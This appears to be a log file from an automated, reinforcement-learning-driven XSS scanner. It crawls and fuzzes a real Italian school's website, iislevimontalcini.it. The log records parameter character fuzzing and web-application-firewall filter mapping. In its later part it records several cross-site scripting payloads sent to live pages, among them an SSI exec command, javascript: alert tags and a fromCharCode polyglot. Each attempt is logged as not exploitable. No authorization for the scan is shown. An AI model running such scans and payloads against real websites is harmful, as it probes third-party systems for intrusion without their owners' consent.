+2025-06-17 04:55:39,432 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=839
+2025-06-17 04:55:39,498 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=913
+2025-06-17 04:55:39,574 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638
+2025-06-17 04:55:39,639 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/menzione-speciale-nel-concorso-fai-agri-cultura
+2025-06-17 04:55:39,708 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1477
+2025-06-17 04:55:39,774 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-professionale-servizi-per-la-sanit-e-assistenza-sociale-
+2025-06-17 04:55:39,839 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131
+2025-06-17 04:55:39,908 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3835
+2025-06-17 04:55:39,977 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/sicurezza-
+2025-06-17 04:55:40,042 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1479
+2025-06-17 04:55:40,107 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/whistleblowing
+2025-06-17 04:55:40,173 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/la-classe-v-sez-m-delliis--rita-levi-montalcini--primo-premio-nel-contest-nazionale-rotaract
+2025-06-17 04:55:40,239 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326
+2025-06-17 04:55:40,305 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/competenze-stem-e-multilinguistiche-nelle-scuole-statali-dm-652023
+2025-06-17 04:55:40,371 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/eipass-center
+2025-06-17 04:55:40,438 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/riduzione-dei-divari-negli-apprendimenti-e-contrasto-dispersione-scolastica-dm-2-febbraio-2024-n-19
+2025-06-17 04:55:40,503 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=1931326&inl=1
+2025-06-17 04:55:40,569 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2031
+2025-06-17 04:55:40,634 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1483
+2025-06-17 04:55:40,703 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601&inl=1
+2025-06-17 04:55:40,768 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3835
+2025-06-17 04:55:40,834 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1479
+2025-06-17 04:55:40,899 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3438
+2025-06-17 04:55:40,966 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/piano-estate-2024-25--programma-nazionale-scuola-e-competenze-2021-2027--fondo-sociale-europeo-plus-fse
+2025-06-17 04:55:41,033 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/calendario-scolastico-regionale
+2025-06-17 04:55:41,099 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---chimica-materiali-e-biotecnologie
+2025-06-17 04:55:41,164 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3491
+2025-06-17 04:55:41,230 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/settimana-pianeta-terra
+2025-06-17 04:55:41,296 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=393
+2025-06-17 04:55:41,361 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/comitato-tecnico-scientifico#maincontent
+2025-06-17 04:55:41,427 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3859
+2025-06-17 04:55:41,499 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/partner-territoriali
+2025-06-17 04:55:41,564 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=295
+2025-06-17 04:55:41,629 - INFO - 
+7 entry points to scan with 5 workers.
+2025-06-17 04:55:41,630 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'tipo' on http://iislevimontalcini.it/cerca[0m
+2025-06-17 04:55:41,631 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'eml' on http://iislevimontalcini.it/pagine/cambridge[0m
+2025-06-17 04:55:41,631 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'act' on http://iislevimontalcini.it/pagine/cambridge[0m
+2025-06-17 04:55:41,631 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'eml' on http://iislevimontalcini.it/pagine/brochure-offerta-formativa[0m
+2025-06-17 04:55:41,632 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'act' on http://iislevimontalcini.it/pagine/brochure-offerta-formativa[0m
+2025-06-17 04:55:42,497 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for tipo.[0m
+2025-06-17 04:55:42,497 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:42,527 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for act.[0m
+2025-06-17 04:55:42,527 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:42,562 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for eml.[0m
+2025-06-17 04:55:42,563 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:42,624 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for eml.[0m
+2025-06-17 04:55:42,624 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:42,627 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for act.[0m
+2025-06-17 04:55:42,627 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:42,632 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:42,632 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:42,633 - INFO - [36m[RL Agent] Exploration: Selecting random action (epsilon-greedy).[0m
+2025-06-17 04:55:42,677 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:42,678 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:42,678 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:42,720 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:42,720 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:42,721 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:42,777 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:42,778 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:42,779 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:42,780 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:42,780 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:42,783 - INFO - [36m[RL Agent] Exploration: Selecting random action (epsilon-greedy).[0m
+2025-06-17 04:55:45,140 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,154 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,164 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/brochure-offerta-formativa. NLP Reflected Type: none[0m
+2025-06-17 04:55:45,165 - INFO - [94m[INFO][0m Payload '%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%2B%27IPT%3Ealert%28%22XSS%22%29%3C/SCR%27%2B%27IPT%3E%27%22--%3E' not found or not exploitable in http://iislevimontalcini.it/pagine/brochure-offerta-formativa.[0m
+2025-06-17 04:55:45,165 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/brochure-offerta-formativa', 'act', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%2B%27IPT%3Ealert%28%22XSS%22%29%3C/SCR%27%2B%27IPT%3E%27%22--%3E, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:45,166 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'eml' on http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione[0m
+2025-06-17 04:55:45,236 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,239 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,249 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/cambridge. NLP Reflected Type: none[0m
+2025-06-17 04:55:45,250 - INFO - [94m[INFO][0m Payload '<IMG srC="HTtp://EXAmplE.COM/imAgE.jPG">' not found or not exploitable in http://iislevimontalcini.it/pagine/cambridge.[0m
+2025-06-17 04:55:45,250 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/cambridge', 'eml', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<IMG srC="HTtp://EXAmplE.COM/imAgE.jPG">, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:45,280 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,285 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,285 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,299 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,299 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/brochure-offerta-formativa. NLP Reflected Type: none[0m
+2025-06-17 04:55:45,299 - INFO - [94m[INFO][0m Payload '&#x3c;img src=""&#x3e;' not found or not exploitable in http://iislevimontalcini.it/pagine/brochure-offerta-formativa.[0m
+2025-06-17 04:55:45,300 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/brochure-offerta-formativa', 'eml', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=&#x3c;img src=""&#x3e;, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:45,316 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/cambridge. NLP Reflected Type: none[0m
+2025-06-17 04:55:45,316 - INFO - [94m[INFO][0m Payload '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;' not found or not exploitable in http://iislevimontalcini.it/pagine/cambridge.[0m
+2025-06-17 04:55:45,316 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/cambridge', 'act', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:45,317 - INFO - [93m[FUZZING][0m Running character fuzzer for parameter 'act' on http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione[0m
+2025-06-17 04:55:45,319 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,321 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,322 - INFO - [36m[RL Agent] Exploration: Selecting random action (epsilon-greedy).[0m
+2025-06-17 04:55:45,367 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,368 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,368 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:45,767 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,771 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,781 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/cerca. NLP Reflected Type: none[0m
+2025-06-17 04:55:45,781 - INFO - [94m[INFO][0m Payload '<IMg Foo=a SRc="JavasCRIpt:AlERT('xSs')">' not found or not exploitable in http://iislevimontalcini.it/cerca.[0m
+2025-06-17 04:55:45,781 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/cerca', 'tipo', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<IMg Foo=a SRc="JavasCRIpt:AlERT('xSs')">, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:45,847 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:45,847 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:45,848 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:45,980 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for eml.[0m
+2025-06-17 04:55:45,981 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:46,138 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:46,139 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:46,139 - INFO - [36m[RL Agent] Exploration: Selecting random action (epsilon-greedy).[0m
+2025-06-17 04:55:46,142 - INFO - [1;32m[FUZZING][0m Character fuzzing complete for act.[0m
+2025-06-17 04:55:46,142 - INFO - [1;32m[WAF][0m Filters updated based on fuzzing: {
+  "<": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ">": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\"": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "'": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "(": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ")": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "/": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "\\": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "`": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  ";": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "{": {
+    "status": "blocked",
+    "encoding_type": "none"
+  },
+  "}": {
+    "status": "blocked",
+    "encoding_type": "none"
+  }
+}[0m
+2025-06-17 04:55:46,275 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:46,275 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:46,276 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:47,499 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:47,506 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:47,517 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/cambridge. NLP Reflected Type: none[0m
+2025-06-17 04:55:47,517 - INFO - [94m[INFO][0m Payload '%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E' not found or not exploitable in http://iislevimontalcini.it/pagine/cambridge.[0m
+2025-06-17 04:55:47,518 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/cambridge', 'captcha', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:47,558 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:47,562 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:47,573 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/pagine/brochure-offerta-formativa. NLP Reflected Type: none[0m
+2025-06-17 04:55:47,573 - INFO - [94m[INFO][0m Payload '<TD BACKGROUND="javascript:alert('XSS')">' not found or not exploitable in http://iislevimontalcini.it/pagine/brochure-offerta-formativa.[0m
+2025-06-17 04:55:47,573 - INFO - [35m[RL Agent] Learning: State=('iislevimontalcini.it/pagine/brochure-offerta-formativa', 'captcha', 'GET', 'generic', 'generic', (('"', 'blocked'), ("'", 'blocked'), ('(', 'blocked'), (')', 'blocked'), ('/', 'blocked'), (';', 'blocked'), ('<', 'blocked'), ('>', 'blocked'), ('\\', 'blocked'), ('`', 'blocked'), ('{', 'blocked'), ('}', 'blocked'))), Action=<TD BACKGROUND="javascript:alert('XSS')">, Reward=-0.5. New Q-value: -0.05[0m
+2025-06-17 04:55:47,582 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:47,582 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:47,582 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:47,641 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:47,642 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': False, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:47,643 - INFO - [36m[RL Agent] Exploitation: State unknown or empty, selecting random action.[0m
+2025-06-17 04:55:48,055 - INFO - [35m[NLP] Performing NLP content analysis...[0m
+2025-06-17 04:55:48,059 - INFO - [32m[NLP] Analysis complete. Results: {'forms_found': False, 'input_fields_count': 0, 'scripts_found': True, 'comments_found': False, 'has_eval_or_write': False, 'has_common_sanitization_patterns': False, 'reflected_location_type': 'none'}[0m
+2025-06-17 04:55:48,067 - INFO - [94m[CONTEXT][0m Payload reflected in context: generic for http://iislevimontalcini.it/cerca. NLP Reflected Type: none[0m
